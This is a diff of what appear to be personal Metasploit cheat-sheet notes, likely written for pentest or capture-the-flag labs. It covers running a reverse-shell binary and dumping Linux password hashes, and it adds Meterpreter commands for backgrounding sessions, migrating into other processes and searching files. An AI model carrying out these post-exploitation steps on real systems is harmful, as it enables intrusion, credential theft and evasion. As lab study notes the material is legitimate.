@@ -317,8 +317,18 @@ set LHOST 10.10.X.X
 set LPORT XXXX
 run
 
+background
+ssesion -i <number>
+
+ps
+migrate <pid>/<ppid>
+
+search -f <smth>
+
 ./rev_shell.elf
 run post/linux/gather/hashdump
+
+
 
 
 
